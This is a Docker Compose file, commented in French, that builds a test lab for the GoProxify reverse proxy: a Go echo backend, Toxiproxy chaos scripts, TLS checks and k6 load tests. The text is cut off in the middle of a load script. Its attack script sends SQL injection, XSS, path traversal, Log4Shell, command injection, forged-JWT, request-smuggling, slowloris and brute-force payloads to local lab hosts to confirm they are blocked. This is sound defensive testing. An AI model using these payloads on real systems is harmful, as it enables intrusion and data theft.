# =============================================================================
# GOPROXIFY — Laboratoire de tests (charge, sécurité, chaos)
#
# Se branche sur le réseau de la stack principale (goproxify_net) : lancer
# d'abord `docker compose up -d` à la racine. Piloter via tests/lab/lab.sh.
#
# Les runners résolvent *.lab.test vers l'IP du Core (extra_hosts, CORE_IP
# fournie par lab.sh) : les tests passent donc par le vrai routage par Host.
# =============================================================================

x-lab-hosts: &lab-hosts
  extra_hosts:
    - "lab-fast.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-waf-block.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-waf-detect.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-ratelimit.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-chaos.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-juice.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-tls.lab.test:${CORE_IP:-127.0.0.1}"
    - "lab-h3.lab.test:${CORE_IP:-127.0.0.1}"

networks:
  goproxify_net:
    external: true
    name: goproxify_net

services:
  # Aucun build ni montage de fichier (indisponibles sur les endpoints Docker distants) : le source Go est
  # embarqué dans SRC, écrit au démarrage puis lancé avec l'image golang officielle (~10 s).
  # Source canonique = ce bloc (pas de fichier séparé).
  lab-backend:
    image: golang:1.22-alpine
    container_name: lab-backend
    working_dir: /app
    entrypoint: ["sh", "-c", "mkdir -p /app && printf %s \"$$SRC\" > /app/main.go && exec go run /app/main.go"]
    environment:
      SRC: |
        package main

        import (
        	"encoding/json"
        	"fmt"
        	"io"
        	"math/rand"
        	"net/http"
        	"os"
        	"strconv"
        	"strings"
        	"time"
        )

        func intQ(r *http.Request, k string, def int) int {
        	if v, err := strconv.Atoi(r.URL.Query().Get(k)); err == nil && v >= 0 {
        		return v
        	}
        	return def
        }

        func main() {
        	mux := http.NewServeMux()

        	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        		fmt.Fprint(w, "ok")
        	})

        	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
        		w.WriteHeader(http.StatusNoContent)
        	})

        	// Renvoie ce que le backend a réellement reçu du proxy (tests d'en-têtes / IP réelle).
        	mux.HandleFunc("/echo", func(w http.ResponseWriter, r *http.Request) {
        		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
        		w.Header().Set("Content-Type", "application/json")
        		_ = json.NewEncoder(w).Encode(map[string]any{
        			"method":  r.Method,
        			"host":    r.Host,
        			"uri":     r.RequestURI,
        			"remote":  r.RemoteAddr,
        			"headers": r.Header,
        			"body_len": len(body),
        		})
        	})

        	mux.HandleFunc("/slow", func(w http.ResponseWriter, r *http.Request) {
        		time.Sleep(time.Duration(intQ(r, "ms", 500)) * time.Millisecond)
        		fmt.Fprint(w, "slow ok")
        	})

        	mux.HandleFunc("/flaky", func(w http.ResponseWriter, r *http.Request) {
        		if rand.Intn(100) < intQ(r, "p", 20) {
        			http.Error(w, "boom", http.StatusInternalServerError)
        			return
        		}
        		fmt.Fprint(w, "ok")
        	})

        	mux.HandleFunc("/bytes", func(w http.ResponseWriter, r *http.Request) {
        		n := intQ(r, "n", 1024)
        		w.Header().Set("Content-Type", "application/octet-stream")
        		w.Header().Set("Content-Length", strconv.Itoa(n))
        		chunk := []byte(strings.Repeat("x", 4096))
        		for n > 0 {
        			c := min(n, len(chunk))
        			if _, err := w.Write(chunk[:c]); err != nil {
        				return
        			}
        			n -= c
        		}
        	})

        	mux.HandleFunc("/status/", func(w http.ResponseWriter, r *http.Request) {
        		code, err := strconv.Atoi(strings.TrimPrefix(r.URL.Path, "/status/"))
        		if err != nil || code < 100 || code > 599 {
        			code = http.StatusBadRequest
        		}
        		w.WriteHeader(code)
        	})

        	mux.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
        		n, _ := io.Copy(io.Discard, r.Body)
        		fmt.Fprintf(w, "%d", n)
        	})

        	mux.HandleFunc("/sse", func(w http.ResponseWriter, r *http.Request) {
        		fl, ok := w.(http.Flusher)
        		if !ok {
        			http.Error(w, "no flush", http.StatusInternalServerError)
        			return
        		}
        		w.Header().Set("Content-Type", "text/event-stream")
        		for i := 0; i < intQ(r, "n", 10); i++ {
        			fmt.Fprintf(w, "data: %d\n\n", i)
        			fl.Flush()
        			select {
        			case <-r.Context().Done():
        				return
        			case <-time.After(time.Duration(intQ(r, "ms", 200)) * time.Millisecond):
        			}
        		}
        	})

        	addr := ":9000"
        	if v := os.Getenv("PORT"); v != "" {
        		addr = ":" + v
        	}
        	srv := &http.Server{Addr: addr, Handler: mux, ReadHeaderTimeout: 10 * time.Second}
        	if err := srv.ListenAndServe(); err != nil {
        		fmt.Fprintln(os.Stderr, err)
        		os.Exit(1)
        	}
        }
    networks: [goproxify_net]
    restart: unless-stopped

  lab-toxiproxy:
    image: ghcr.io/shopify/toxiproxy:2.9.0
    container_name: lab-toxiproxy
    networks: [goproxify_net]

  # >>> GENERATED (tests/lab/gen-compose.sh) — ne pas éditer à la main
  # Runners permanents pour `docker exec` : scripts embarqués, écrits au démarrage.
  lab-tools:
    image: alpine:3.20
    container_name: lab-tools
    restart: unless-stopped
    entrypoint:
      - sh
      - -c
      - |
        apk add --no-cache bash curl jq netcat-openbsd openssl coreutils >/dev/null
        mkdir -p /lab/scripts
        for f in seed attacks chaos tls hosts auth cleanup; do eval "printf %s \"\$$S_$$f\"" > /lab/scripts/$$f.sh; done
        exec sleep infinity
    networks: [goproxify_net]
    environment:
      LAB_ADMIN_URL: http://goproxify-admin:9443
      S_seed: |
        #!/usr/bin/env bash
        # Crée les routes du labo via l'API Admin (idempotent : un host déjà présent est ignoré)
        # et le proxy Toxiproxy utilisé par les scénarios de chaos.
        set -u
        . /lab/scripts/hosts.sh
        . /lab/scripts/auth.sh

        have=$$(curl -s -H "Authorization: Bearer $$token" "$$LAB_ADMIN_URL/api/v1/proxies" | jq -r '.[]? | .name // empty')

        route() { # host backend [extra json merge]
          local body
          if echo "$$have" | grep -qx "$$1"; then printf '%-28s déjà présent : ignoré\n' "$$1"; return; fi
          body=$$(jq -n --arg h "$$1" --arg b "$$2" --argjson x "$${3:-{\}}" \
            '{config: ({host:$$h, type:"http", tls_enabled:false, backends:[{url:$$b, weight:1}]} + $$x)}')
          code=$$(curl -s -o /tmp/seed.out -w '%{http_code}' -X POST "$$LAB_ADMIN_URL/api/v1/proxies" \
            -H "Authorization: Bearer $$token" -H 'Content-Type: application/json' -d "$$body")
          printf '%-28s -> %s (%s)\n' "$$1" "$$2" "$$code"
          case "$$code" in 2*) ;; *) jq -r '(.dry_run.errors // [])[] | "  erreur : " + .' /tmp/seed.out 2>/dev/null || head -c 300 /tmp/seed.out; ;; esac
        }

        route lab-fast.lab.test        http://lab-backend:9000
        route lab-waf-block.lab.test   http://lab-backend:9000 '{"waf":{"enabled":true,"mode":"block","max_body_mb":1,"anomaly_threshold":0}}'
        route lab-waf-detect.lab.test  http://lab-backend:9000 '{"waf":{"enabled":true,"mode":"detect","max_body_mb":1,"anomaly_threshold":0}}'
        route lab-ratelimit.lab.test   http://lab-backend:9000 '{"rate_limit":{"rps":10,"burst":20}}'
        route lab-chaos.lab.test       http://lab-toxiproxy:8666
        route lab-juice.lab.test       http://lab-juice:3000    '{"waf":{"enabled":true,"mode":"detect","max_body_mb":5,"anomaly_threshold":0}}'

        curl -s -X POST http://lab-toxiproxy:8474/proxies -H 'Content-Type: application/json' \
          -d '{"name":"backend","listen":"0.0.0.0:8666","upstream":"lab-backend:9000","enabled":true}' >/dev/null
        echo "toxiproxy: backend :8666 -> lab-backend:9000"
      S_attacks: |
        #!/usr/bin/env bash
        # Batterie d'attaques ciblées avec verdict PASS/FAIL. Code retour = nombre d'échecs.
        # Périmètre : le labo local uniquement (*.lab.test, Core du labo, Admin du labo).
        set -u
        . /lab/scripts/hosts.sh
        CORE_HOST=$${CORE_HOST:-goproxify-core}
        ADMIN=$${LAB_ADMIN_URL:-http://goproxify-admin:9443}
        fail=0

        ok()   { printf '  \033[32mPASS\033[0m %s\n' "$$1"; }
        ko()   { printf '  \033[31mFAIL\033[0m %s\n' "$$1"; fail=$$((fail+1)); }
        code() { curl -s -o /dev/null -w '%{http_code}' --max-time 15 "$$@"; }
        expect_in() { # description got allowed...
          local d=$$1 got=$$2; shift 2
          for a in "$$@"; do [ "$$got" = "$$a" ] && { ok "$$d ($$got)"; return; }; done
          ko "$$d : obtenu $$got, attendu $$*"
        }

        # Garde-fou : après un redéploiement, lab-backend recompile son code et le Core répond 502 en attendant.
        # Sans cela, tous les contrôles échouent pour une raison sans rapport avec la sécurité.
        ready=0
        for _ in $$(seq 1 30); do
          [ "$$(code http://lab-fast.lab.test/)" = 200 ] && { ready=1; break; }
          sleep 2
        done
        [ $$ready = 1 ] || { echo "  FAIL route de référence lab-fast.lab.test indisponible après 60 s (lab-backend démarré ? seed fait ?) — arrêt"; exit 1; }

        echo "== WAF (mode block) =="
        B=http://lab-waf-block.lab.test
        expect_in "SQLi ' OR 1=1"              "$$(code "$$B/?id=1%27%20OR%20%271%27%3D%271")"                403
        expect_in "SQLi UNION SELECT"          "$$(code "$$B/?q=1%20UNION%20SELECT%20username,password%20FROM%20users")" 403
        expect_in "XSS <script>"               "$$(code "$$B/?q=%3Cscript%3Ealert(1)%3C/script%3E")"       403
        trav() { local out; out=$$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" --max-time 15 --path-as-is "$$1"); case "$${out%% *}" in 301|308) case "$$out" in *..*) echo "301-non-nettoye";; *) echo 400;; esac;; *) echo "$${out%% *}";; esac; }
        expect_in "Path traversal (rejet ou chemin nettoyé)" "$$(trav "$$B/../../../../etc/passwd")" 400 403 404
        expect_in "Traversal encodé"           "$$(code "$$B/?f=..%2f..%2f..%2fetc%2fpasswd")"             403
        expect_in "Log4Shell (User-Agent)"     "$$(code -H 'User-Agent: $${jndi:ldap://x.test/a}' "$$B/")"  403
        expect_in "Injection commande"         "$$(code "$$B/?cmd=;cat%20/etc/passwd")"                    403
        expect_in "Trafic légitime passe"      "$$(code "$$B/")"                                           200

        echo "== WAF (mode detect : ne doit pas bloquer) =="
        expect_in "SQLi tolérée en detect"     "$$(code "http://lab-waf-detect.lab.test/?id=1%27%20OR%20%271%27%3D%271")" 200

        echo "== Anti-usurpation d'IP / en-têtes =="
        out=$$(curl -s -H 'X-Forwarded-For: 6.6.6.6' -H 'X-Real-IP: 6.6.6.6' http://lab-fast.lab.test/echo)
        last_xff=$$(echo "$$out" | jq -r '.headers["X-Forwarded-For"][0] // ""' | awk -F', *' '{print $$NF}')
        real=$$(echo "$$out" | jq -r '.headers["X-Real-Ip"][0] // ""')
        # Ce runner est sur un réseau privé = proxy de confiance par défaut : X-Real-IP fourni peut légitimement être repris.
        # On vérifie donc que le Core ajoute bien l'IP réelle du pair en fin de X-Forwarded-For.
        [ "$$last_xff" != "6.6.6.6" ] && ok "Core ajoute l'IP du pair en fin de XFF (xff=$$last_xff)" || ko "XFF non complété par le Core (xff=$$last_xff)"
        echo "  info  X-Real-IP reçu par le backend : $${real:-<absent>} (attendu si le pair est un proxy de confiance)"
        hop=$$(curl -s -H 'Connection: X-Secret' -H 'X-Secret: 1' http://lab-fast.lab.test/echo | jq -r '.headers["X-Secret"] // empty')
        [ -z "$$hop" ] && ok "en-tête hop-by-hop (Connection:) retiré" || ko "hop-by-hop X-Secret transmis"

        echo "== Routage / Host =="
        expect_in "Host inconnu"               "$$(code -H 'Host: inconnu.lab.test' "http://$$CORE_HOST/")"  404 421 502 503
        raw_status() { # requête brute (curl ne sait pas envoyer deux Host)
          exec 3<>"/dev/tcp/$$CORE_HOST/80" || { echo 000; return; }
          printf '%b' "$$1" >&3
          read -r -t 10 line <&3; exec 3>&-
          echo "$$line" | awk '{print $$2}'
        }
        expect_in "Host en double (requête brute)" "$$(raw_status 'GET / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nHost: evil.test\r\nConnection: close\r\n\r\n')" 400 404 421
        expect_in "TRACE refusé"               "$$(code -X TRACE http://lab-fast.lab.test/)"                400 403 405 501
        expect_in "En-tête de 64 Ko"           "$$(code -H "X-Big: $$(head -c 65536 /dev/zero | tr '\0' a)" http://lab-fast.lab.test/)" 400 431 413
        st=$$(head -c 3000000 /dev/zero | curl -s --max-time 30 -o /tmp/up.out -w '%{http_code}' -X POST --data-binary @- "$$B/upload")
        if [ "$$st" = 200 ] && [ "$$(cat /tmp/up.out)" = 3000000 ]; then ok "corps 3 Mo (> max_body_mb=1) transmis intact au backend"
        else ko "corps 3 Mo (> max_body_mb=1) : HTTP $$st, backend a reçu '$$(head -c 20 /tmp/up.out | tr -d '\n<')' sur 3000000 octets"; fi

        echo "== Request smuggling (CL + TE) =="
        resp=$$(printf 'POST / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: lab-fast.lab.test\r\n\r\n' \
          | nc -w 5 "$$CORE_HOST" 80 | grep -c '^HTTP/1.1 ')
        [ "$${resp:-0}" -le 1 ] && ok "un seul verdict HTTP pour une requête CL+TE ($$resp)" || ko "$$resp réponses : smuggling possible"

        echo "== Rate limiting =="
        n429=0
        for _ in $$(seq 1 120); do [ "$$(code http://lab-ratelimit.lab.test/)" = 429 ] && n429=$$((n429+1)); done
        [ $$n429 -gt 0 ] && ok "429 renvoyés en rafale ($$n429/120)" || ko "aucun 429 sur 120 requêtes rapides (rps=10 burst=20)"

        echo "== Robustesse connexions lentes (slowloris) =="
        exec 3<>"/dev/tcp/$$CORE_HOST/80"
        printf 'GET / HTTP/1.1\r\nHost: lab-fast.lab.test\r\nX-Slow: ' >&3
        start=$$(date +%s)
        read -r -t 45 -n1 <&3 || true   # rend la main dès que le serveur ferme (ou après 45 s)
        dur=$$(( $$(date +%s) - start )); exec 3>&-
        [ $$dur -lt 40 ] && ok "connexion à en-têtes incomplets coupée après $${dur}s" || ko "connexion lente tenue $${dur}s (pas de read-header timeout)"

        if [ "$${LAB_SAFE:-0}" = 1 ]; then
          echo "== Admin API == (ignoré : LAB_SAFE=1)"
        else
        echo "== Admin API =="
        expect_in "GET /proxies sans jeton"    "$$(code "$$ADMIN/api/v1/proxies")"                           401 403
        expect_in "JWT forgé (alg=none)"       "$$(code -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.' "$$ADMIN/api/v1/proxies")" 401 403
        expect_in "Traversal API (rejet ou chemin nettoyé)" "$$(trav "$$ADMIN/api/v1/../../etc/passwd")"  400 401 403 404
        last=000
        for i in $$(seq 1 25); do
          last=$$(code -X POST "$$ADMIN/api/v1/auth/login" -H 'Content-Type: application/json' \
            -d "{\"email\":\"attacker@lab.test\",\"password\":\"bad$$i\"}")
        done
        expect_in "Brute-force login : freinage (429/423 attendu après 25 essais)" "$$last" 429 423
        fi

        echo
        [ $$fail -eq 0 ] && echo "Tous les contrôles sont passés." || echo "$$fail contrôle(s) en échec."
        exit $$fail
      S_chaos: |
        #!/usr/bin/env bash
        # Chaos réseau côté backend via Toxiproxy : le Core doit dégrader proprement (5xx rapide, pas de blocage)
        # et se rétablir seul. Code retour = nombre d'échecs.
        set -u
        . /lab/scripts/hosts.sh
        T=http://lab-toxiproxy:8474
        URL=http://lab-chaos.lab.test
        fail=0
        ok() { printf '  \033[32mPASS\033[0m %s\n' "$$1"; }
        ko() { printf '  \033[31mFAIL\033[0m %s\n' "$$1"; fail=$$((fail+1)); }
        req() { curl -s -o /dev/null -w '%{http_code} %{time_total}' --max-time "$${1:-20}" "$$URL$${2:-/}"; }
        reset() { curl -s -X POST "$$T/reset" >/dev/null; }
        toxic() { curl -s -X POST "$$T/proxies/backend/toxics" -H 'Content-Type: application/json' -d "$$1" >/dev/null; }
        recovers() { for _ in $$(seq 1 15); do [ "$$(req 5 | cut -d' ' -f1)" = 200 ] && return 0; sleep 1; done; return 1; }

        # Toxiproxy est sans état : le proxy disparaît à chaque redémarrage du conteneur. Création idempotente (409 si déjà là).
        curl -s -X POST "$$T/proxies" -H 'Content-Type: application/json' \
          -d '{"name":"backend","listen":"0.0.0.0:8666","upstream":"lab-backend:9000","enabled":true}' >/dev/null
        reset
        if [ "$$(req | cut -d' ' -f1)" = 200 ]; then ok "référence saine"; else
          echo "  FAIL route chaos injoignable : vérifier lab-toxiproxy, lab-backend et la route lab-chaos.lab.test (seed) — arrêt"; exit 1
        fi

        echo "== Latence +1500 ms =="
        toxic '{"type":"latency","attributes":{"latency":1500,"jitter":200}}'
        read -r c t <<<"$$(req)"; awk -v t="$$t" 'BEGIN{exit !(t>=1.4)}' && ok "latence propagée ($$c en $${t}s)" || ko "latence non observée ($$c $${t}s)"
        reset; recovers && ok "rétablissement après latence" || ko "pas de rétablissement"

        echo "== Backend coupé (proxy désactivé) =="
        curl -s -X POST "$$T/proxies/backend" -H 'Content-Type: application/json' -d '{"enabled":false}' >/dev/null
        read -r c t <<<"$$(req 20)"
        case "$$c" in 502|503|504) awk -v t="$$t" 'BEGIN{exit !(t<10)}' && ok "erreur $$c rapide ($${t}s)" || ko "erreur $$c mais lente ($${t}s)";; *) ko "code inattendu $$c";; esac
        curl -s -X POST "$$T/proxies/backend" -H 'Content-Type: application/json' -d '{"enabled":true}' >/dev/null
        recovers && ok "reprise automatique après retour du backend" || ko "Core n'a pas repris le backend (circuit non refermé ?)"

        echo "== Connexion réinitialisée (RST) =="
        toxic '{"type":"reset_peer","attributes":{"timeout":0}}'
        c=$$(req 10 | cut -d' ' -f1); case "$$c" in 502|503|504) ok "RST -> $$c";; *) ko "RST -> $$c";; esac
        reset; recovers && ok "rétablissement après RST" || ko "pas de rétablissement"

        echo "== Backend muet (timeout) =="
        toxic '{"type":"timeout","attributes":{"timeout":0}}'
        read -r c t <<<"$$(req 90)"
        case "$$c" in 502|503|504) ok "timeout amont -> $$c après $${t}s";; *) ko "timeout amont -> $$c ($${t}s) : le Core bloque le client ?";; esac
        reset; recovers && ok "rétablissement après timeout" || ko "pas de rétablissement"

        echo "== Bande passante 50 Ko/s sur 1 Mo (client lent / backend lent) =="
        toxic '{"type":"bandwidth","attributes":{"rate":50}}'
        read -r c t <<<"$$(req 60 '/bytes?n=1048576')"; echo "  info: $$c en $${t}s"
        reset; recovers && ok "rétablissement après bridage" || ko "pas de rétablissement"

        reset
        echo; [ $$fail -eq 0 ] && echo "Chaos : OK." || echo "$$fail contrôle(s) en échec."
        exit $$fail
      S_tls: |
        #!/usr/bin/env bash
        # Tests TLS/HTTP3 du labo. Génère un cert auto-signé pour *.lab.test, l'importe dans
        # l'Admin, crée les routes TLS, puis vérifie HTTPS et les en-têtes de sécurité TLS.
        # Code retour = nombre d'échecs.
        set -u
        . /lab/scripts/hosts.sh
        . /lab/scripts/auth.sh
        CORE_HOST=$${CORE_HOST:-goproxify-core}
        fail=0

        ok()   { printf '  \033[32mPASS\033[0m %s\n' "$$1"; }
        ko()   { printf '  \033[31mFAIL\033[0m %s\n' "$$1"; fail=$$((fail+1)); }
        code_tls() { curl -sk -o /dev/null -w '%{http_code}' --max-time 15 "$$@"; }
        hdr()  { curl -sk -o /dev/null -D - --max-time 15 "$$@" | tr -d '\r'; }

        # ---------------------------------------------------------------------------
        # 1. Génération du certificat auto-signé *.lab.test (EC P-256, valide 365 j)
        # ---------------------------------------------------------------------------
        echo "== Génération du certificat auto-signé *.lab.test =="
        TMP=$$(mktemp -d)
        openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes \
          -days 365 -subj '/CN=*.lab.test' \
          -addext 'subjectAltName=DNS:*.lab.test,DNS:lab.test' \
          -keyout "$$TMP/key.pem" -out "$$TMP/cert.pem" 2>/dev/null
        [ -s "$$TMP/cert.pem" ] && ok "cert auto-signé généré (P-256)" || { ko "génération du cert échouée"; exit 1; }

        # ---------------------------------------------------------------------------
        # 2. Import du cert dans l'Admin
        # ---------------------------------------------------------------------------
        echo "== Import du cert dans l'Admin =="
        cert_pem=$$(cat "$$TMP/cert.pem")
        key_pem=$$(cat "$$TMP/key.pem")
        body=$$(jq -n --arg c "$$cert_pem" --arg k "$$key_pem" '{cert_pem:$$c,key_pem:$$k}')
        icode=$$(curl -s -o /tmp/import.out -w '%{http_code}' -X POST "$$LAB_ADMIN_URL/api/v1/certs/import" \
          -H "Authorization: Bearer $$token" -H 'Content-Type: application/json' -d "$$body")
        case "$$icode" in
          200|201|204) ok "cert importé dans l'Admin ($$icode)" ;;
          409)         ok "cert déjà présent (409 — idempotent)" ;;
          *)           ko "import cert : HTTP $$icode ($$(head -c 200 /tmp/import.out))"; exit 1 ;;
        esac

        # Laisser au Core le temps de récupérer le cert
        sleep 2

        # ---------------------------------------------------------------------------
        # 3. Création des routes TLS (idempotent)
        # ---------------------------------------------------------------------------
        echo "== Création des routes TLS =="
        have=$$(curl -s -H "Authorization: Bearer $$token" "$$LAB_ADMIN_URL/api/v1/proxies" | jq -r '.[]? | .name // empty')

        route_tls() { # host backend [extra json]
          if echo "$$have" | grep -qx "$$1"; then printf '%-32s déjà présent : ignoré\n' "$$1"; return; fi
          local body
          body=$$(jq -n --arg h "$$1" --arg b "$$2" --argjson x "$${3:-{\}}" \
            '{config: ({host:$$h, type:"http", tls_enabled:true, backends:[{url:$$b, weight:1}]} + $$x)}')
          code=$$(curl -s -o /tmp/seed.out -w '%{http_code}' -X POST "$$LAB_ADMIN_URL/api/v1/proxies" \
            -H "Authorization: Bearer $$token" -H 'Content-Type: application/json' -d "$$body")
          printf '%-32s -> %s (%s)\n' "$$1" "$$2" "$$code"
          case "$$code" in 2*) ;; *) head -c 300 /tmp/seed.out; echo; ;; esac
        }

        route_tls lab-tls.lab.test http://lab-backend:9000
        route_tls lab-h3.lab.test  http://lab-backend:9000

        # Attendre que le Core prenne en compte les routes
        sleep 2
        ready=0
        for _ in $$(seq 1 15); do
          [ "$$(code_tls "https://lab-tls.lab.test/")" = 200 ] && { ready=1; break; }
          sleep 2
        done
        [ $$ready = 1 ] || { ko "lab-tls.lab.test inaccessible après 30 s en HTTPS (cert importé ? route créée ?)"; exit 1; }
        ok "lab-tls.lab.test répond en HTTPS"

        # ---------------------------------------------------------------------------
        # 4. Contrôles HTTPS
        # ---------------------------------------------------------------------------
        echo "== HTTPS — contrôles de base =="
        expect_in() {
          local d=$$1 got=$$2; shift 2
          for a in "$$@"; do [ "$$got" = "$$a" ] && { ok "$$d ($$got)"; return; }; done
          ko "$$d : obtenu $$got, attendu $$*"
        }

        expect_in "GET / en HTTPS" "$$(code_tls "https://lab-tls.lab.test/")" 200
        expect_in "WAF bloc SQLi sur HTTPS" \
          "$$(code_tls "https://lab-tls.lab.test/?id=1%27%20OR%20%271%27%3D%271")" \
          200 403   # selon la config WAF de la route (pas de WAF ici → 200 attendu)

        echo "== HTTPS — en-têtes de sécurité TLS =="
        headers=$$(hdr "https://lab-tls.lab.test/")

        # HSTS
        if echo "$$headers" | grep -qi 'strict-transport-security'; then
          ok "Strict-Transport-Security présent"
        else
          ko "Strict-Transport-Security absent"
        fi

        # Alt-Svc / HTTP3
        if echo "$$headers" | grep -qi 'alt-svc'; then
          ok "Alt-Svc présent (HTTP/3 annoncé)"
        else
          echo "  info  Alt-Svc absent (HTTP/3 non annoncé ou désactivé pour cette route)"
        fi

        echo "== HTTPS — SNI et cert =="
        cn=$$(echo | openssl s_client -connect "$$CORE_HOST:443" -servername lab-tls.lab.test 2>/dev/null \
          | openssl x509 -noout -subject 2>/dev/null | sed 's/.*CN\s*=\s*//')
        [ -n "$$cn" ] && ok "certificat servi par le Core (CN=$$cn)" || ko "impossible de lire le CN du certificat servi"

        echo "== HTTPS — Protocole : TLS 1.2 refusé (TLS 1.3 attendu comme minimum) =="
        tls12=$$(echo | openssl s_client -connect "$$CORE_HOST:443" -servername lab-tls.lab.test \
          -tls1_2 2>&1 | grep -c 'Cipher is\|CONNECTED')
        [ "$${tls12:-0}" -gt 0 ] \
          && echo "  info  TLS 1.2 accepté (attendu si TLS 1.2 n'est pas désactivé explicitement)" \
          || ok "TLS 1.2 refusé par le Core"

        rm -rf "$$TMP"
        echo
        [ $$fail -eq 0 ] && echo "TLS : OK." || echo "$$fail contrôle(s) en échec."
        exit $$fail
      S_hosts: |
        #!/bin/sh
        # Résout *.lab.test vers l'IP du Core (trouvée par DNS Docker) : évite CORE_IP et extra_hosts.
        ip=$$(getent hosts "$${CORE_HOST:-goproxify-core}" | awk '{print $$1; exit}')
        [ -n "$$ip" ] || { echo "goproxify-core introuvable sur goproxify_net (stack principale démarrée ?)" >&2; exit 1; }
        grep -v '\.lab\.test' /etc/hosts > /tmp/hosts.new
        for h in lab-fast lab-waf-block lab-waf-detect lab-ratelimit lab-chaos lab-juice lab-tls lab-h3; do echo "$$ip $$h.lab.test" >> /tmp/hosts.new; done
        cat /tmp/hosts.new > /etc/hosts
      S_auth: |
        #!/usr/bin/env bash
        # Source : obtient $$token (PAT via LAB_ADMIN_TOKEN de préférence, sinon login email/mot de passe).
        : "$${LAB_ADMIN_URL:?}"
        token=$${LAB_ADMIN_TOKEN:-}
        if [ -z "$$token" ]; then
          : "$${LAB_ADMIN_EMAIL:?définir LAB_ADMIN_TOKEN ou LAB_ADMIN_EMAIL/LAB_ADMIN_PASSWORD}" "$${LAB_ADMIN_PASSWORD:?}"
          token=$$(curl -fsS -X POST "$$LAB_ADMIN_URL/api/v1/auth/login" \
            -H 'Content-Type: application/json' \
            -d "$$(jq -n --arg e "$$LAB_ADMIN_EMAIL" --arg p "$$LAB_ADMIN_PASSWORD" '{email:$$e,password:$$p}')" | jq -r .token)
        fi
        [ -n "$$token" ] && [ "$$token" != null ] || { echo "authentification admin impossible (MFA activée ? utiliser LAB_ADMIN_TOKEN)"; exit 1; }
      S_cleanup: |
        #!/usr/bin/env bash
        # Supprime toutes les routes *.lab.test créées par seed.sh (à lancer après les tests).
        set -u
        . /lab/scripts/auth.sh
        ids=$$(curl -s -H "Authorization: Bearer $$token" "$$LAB_ADMIN_URL/api/v1/proxies" | jq -r '.[]? | select((.name // "") | endswith(".lab.test")) | "\(.id) \(.name)"')
        [ -n "$$ids" ] || { echo "aucune route *.lab.test"; exit 0; }
        echo "$$ids" | while read -r id name; do
          code=$$(curl -s -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: Bearer $$token" "$$LAB_ADMIN_URL/api/v1/proxies/$$id")
          printf '%-28s %s (%s)\n' "$$name" "$$id" "$$code"
        done
        echo "Vérifier dans l'UI qu'il ne reste aucune route lab-* (révisions en attente comprises)."

  lab-k6:
    image: grafana/k6:latest
    container_name: lab-k6
    user: root
    restart: unless-stopped
    entrypoint:
      - sh
      - -c
      - |
        mkdir -p /scripts /results
        for f in common smoke moderate saturation baseline spike stress soak mixed tls-smoke hosts; do eval "printf %s \"\$$K_$$f\"" > /scripts/$$f.js; done
        mv /scripts/hosts.js /hosts.sh
        exec sleep infinity
    networks: [goproxify_net]
    environment:
      K_common: |
        import http from "k6/http";
        import { check } from "k6";

        export const HOST = __ENV.HOST || "lab-fast.lab.test";
        export const BASE = `http://$${HOST}`;

        export function get(path, tags) {
          const res = http.get(`$${BASE}$${path}`, { tags });
          check(res, { "status 2xx": (r) => r.status >= 200 && r.status < 300 });
          return res;
        }

        export function summary(name) {
          return (data) => ({
            [`/results/$${name}.json`]: JSON.stringify(data, null, 2),
            stdout: textSummary(data),
          });
        }

        function textSummary(d) {
          const m = d.metrics;
          const p = (k, q) => (m[k] && m[k].values[q] !== undefined ? m[k].values[q].toFixed(1) : "-");
          return [
            "",
            `requêtes   : $${m.http_reqs.values.count} ($${m.http_reqs.values.rate.toFixed(0)}/s)`,
            `échecs     : $${(m.http_req_failed.values.rate * 100).toFixed(2)} %`,
            `latence ms : p50=$${p("http_req_duration", "med")} p95=$${p("http_req_duration", "p(95)")} p99=$${p("http_req_duration", "p(99)")} max=$${p("http_req_duration", "max")}`,
            "",
          ].join("\n");
        }
      K_smoke: |
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          vus: 2,
          duration: "15s",
          thresholds: { http_req_failed: ["rate<0.01"], http_req_duration: ["p(95)<200"] },
        };

        export default function () {
          get("/");
          get("/echo");
        }

        export const handleSummary = summary("smoke");
      K_moderate: |
        // Charge modérée à DÉBIT IMPOSÉ (modèle ouvert) : RATE req/s (défaut 300) pendant DURATION (défaut 1m).
        // Le débit est fixé sous le plafond du système : la latence mesurée est celle du service, pas d'une file d'attente.
        // dropped_iterations > 0 signifie que le système n'a pas tenu le débit demandé.
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
          scenarios: {
            moderate: {
              executor: "constant-arrival-rate",
              rate: Number(__ENV.RATE || 300),
              timeUnit: "1s",
              duration: __ENV.DURATION || "1m",
              preAllocatedVUs: 100,
              maxVUs: 400,
            },
          },
          thresholds: {
            http_req_failed: ["rate<0.01"],
            http_req_duration: ["p(95)<100", "p(99)<300"],
            dropped_iterations: ["count==0"],
          },
        };

        export default function () {
          const r = Math.random();
          if (r < 0.8) get("/");
          else if (r < 0.9) get("/echo");
          else get("/bytes?n=65536");
        }

        export const handleSummary = summary("moderate");
      K_saturation: |
        // Saturation : 50 VUs sans pause pendant ~1 min (modèle fermé). Mesure le DÉBIT ATTEINT par le système
        // (k6 + Core + backend sur la même machine). Les latences reflètent alors la file d'attente
        // (loi de Little : latence moyenne ≈ VUs / débit) : aucun seuil de latence, erreurs seulement.
        import { get, summary } from "./common.js";

        export const options = {
          summaryTrendStats: ["avg", "med", "p(90)", "p(95)", "p(99)", "max"],
